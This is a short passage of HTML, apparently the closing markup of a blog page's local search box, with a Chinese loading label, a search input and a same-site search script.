fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
